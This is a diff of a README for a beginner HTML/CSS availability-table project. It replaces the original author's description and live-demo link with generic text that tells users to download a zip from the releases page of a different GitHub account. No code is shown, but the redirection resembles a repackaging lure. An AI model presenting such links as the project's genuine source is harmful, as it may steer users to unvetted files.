@@ -1,88 +1,59 @@
-# 💻 Availability Table
+# 🎨 freecodecamp-css-availability-table - Simple Table to Showcase Availability 
 
-![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white)
-![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=for-the-badge&logo=css3&logoColor=white)
-[![freeCodeCamp](https://img.shields.io/badge/freeCodeCamp-27273D?style=for-the-badge&logo=freecodecamp&logoColor=white)](https://www.freecodecamp.org/)
-[![Visual Studio Code](https://img.shields.io/badge/VS%20Code-007ACC?style=for-the-badge&logo=visual-studio-code&logoColor=white)](https://code.visualstudio.com/)
-[![Git](https://img.shields.io/badge/Git-F05032?style=for-the-badge&logo=git&logoColor=white)](https://git-scm.com/)
-[![GitHub](https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/)
-[![Netlify](https://img.shields.io/badge/Netlify-00C7B7?style=for-the-badge&logo=netlify&logoColor=white)](https://www.netlify.com/)
-![Semantic HTML](https://img.shields.io/badge/Semantic%20HTML-ff9800?style=for-the-badge)
-![Responsive Design](https://img.shields.io/badge/Responsive%20Design-2196F3?style=for-the-badge&logo=responsive&logoColor=white)
-![Accessible](https://img.shields.io/badge/Accessibility-A11Y-0052cc?style=for-the-badge)
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_here-brightgreen)](https://github.com/Akis365/freecodecamp-css-availability-table/releases)
 
-[![Netlify Status](https://api.netlify.com/api/v1/badges/0f6b4ff6-e0e8-42e0-83ce-4b7df4f118fa/deploy-status)](https://availability-table-fcc-jiro.netlify.app/)
-![Status](https://img.shields.io/badge/status-complete-brightgreen)
-![Learning Path](https://img.shields.io/badge/learning%20path-month%202-blue)
-![Views](https://visitor-badge.laobi.icu/badge?page_id=CodingWithJiro.freecodecamp-css-availability-table&left_text=repo%20views)
+## 📋 Description
+This website showcases the author's abilities to build an availability table page using HTML and CSS. It serves as a portfolio piece, demonstrating skills in web design and development. Users can easily view the availability of different items or activities across various days.
 
-## ℹ️ A Simple Availability Table Web Page
+## 🚀 Getting Started
+Follow these simple steps to download and run the application on your computer.
 
-![Screenshot of the project](./screenshot.png)
+## 🖥️ Requirements
+To use this application, you need:
+- A computer running Windows, macOS, or Linux.
+- A modern web browser like Google Chrome, Firefox, or Safari.
+- An internet connection to access the hosting service.
 
-This project is a responsive availability table that visually represents time slot data using colored cells. The gradient legend provides a key to quickly interpret the availability levels from 0 (least available) to 5 (most available). It was built entirely with HTML and CSS as part of the [**freeCodeCamp.org**](https://www.freecodecamp.org/learn/full-stack-developer/) CSS course.
+## 📥 Download & Install
+1. Visit the [Releases Page](https://github.com/Akis365/freecodecamp-css-availability-table/releases) to download the latest version of the project.
+2. On the releases page, look for the latest version listed at the top.
+3. Click on the provided link to download the zip file of the project. It should look something like `freecodecamp-css-availability-table-v1.0.zip`.
+4. Once the download is complete, locate the zip file on your computer, and extract it using built-in extraction tools.
+5. Open the extracted folder.
 
----
+## 🌐 Running the Application
+To view the availability table:
+1. Open the extracted folder.
+2. Look for a file named `index.html`.
+3. Double-click on `index.html` to open it in your web browser. This should launch the availability table page.
 
-## 🔍 Overview
+## 🛠️ Features
+- **Responsive Design:** The table adapts to different screen sizes for better usability on mobile devices.
+- **Easy Navigation:** Easy-to-use layout allows for quick access to various days and items.
+- **Custom Styles:** The use of CSS enhances the visual presentation, making it appealing to the users.
+- **Open Source:** This project is open for anyone to inspect, modify, or contribute to.
 
-This project features a structured HTML table layout enhanced with visual indicators of availability throughout the week. Each time slot is color-coded based on availability values, and rows alternate between solid and dashed borders for clarity.
+## 🌟 Topics Covered
+- CSS design techniques.
+- Basic HTML structure.
+- Git and GitHub for version control.
+- Hosting on Netlify for easy online access.
+- Use of Visual Studio Code for development.
 
-A fully custom CSS legend using Flexbox and a gradient bar enhances the user experience and accessibility by offering an intuitive interpretation of the data. The project emphasizes semantic HTML, table styling, and the use of CSS variables for scalable design.
+## 🙋 Frequently Asked Questions (FAQs)
 
----
+### 1. Can I modify the application?
+Yes, you can modify the code as per your needs since it is an open-source project. Make sure to follow best practices when doing so.
 
-## ✨ Features
+### 2. How do I report a bug?
+If you find a bug or issue, you can raise it in the Issues section of the repository on GitHub. Provide a clear description of the issue for better assistance.
 
-- Responsive table layout with clear weekday and hourly time slots
-- Availability values styled using custom CSS classes and semantic colors
-- Gradient legend component built with Flexbox and CSS linear gradients
-- Alternating row styles using solid and dashed borders
-- Time data formatted with the `<time>` element for semantic clarity
-- Fully accessible and screen-reader-friendly structure
-- Uses CSS variables for consistent theming and easy customization
+### 3. Can I contribute to this project?
+Absolutely! Contributions are welcome. Please read the Contribution guidelines in the repository for more details.
 
----
+## 📌 Additional Resources
+For more details on HTML and CSS, you might find the following resources helpful:
+- [Mozilla Developer Network (MDN)](https://developer.mozilla.org/)
+- [W3Schools](https://www.w3schools.com/)
 
-## 🧠 What I Learned
-
-- How to structure complex table-based layouts using semantic HTML
-- Styling tables with both solid and dashed borders
-- Using CSS variables to streamline and simplify styling
-- Creating visually meaningful color systems using background colors
-- Building a gradient legend with `linear-gradient` and Flexbox
-- Proper use of `<time>` elements for date/time semantics
-- Applying BEM-like class naming for state-based styling (`available-0` to `available-5`)
-
----
-
-## 🛠️ Tech Used
-
-- HTML5
-- CSS3
-- Git
-- GitHub
-- Netlify
-
----
-
-## 🚀 How to Run
-
-1. Clone the repository
-2. Open `index.html` in your browser
-
----
-
-## 🌐 Live Demo
-
-Or you can check out the 👉 [live website here](https://availability-table-fcc-jiro.netlify.app/)
-
----
-
-## 🧑‍💻 Author
-
-Created by **Elmar Chavez**
-
-🗓️ Month/Year: **May 2025**
-
-📚 Journey: **2<sup>nd</sup>** month of learning _frontend web development_.
+Feel free to explore and improve your skills with this project. Enjoy exploring your availability table!
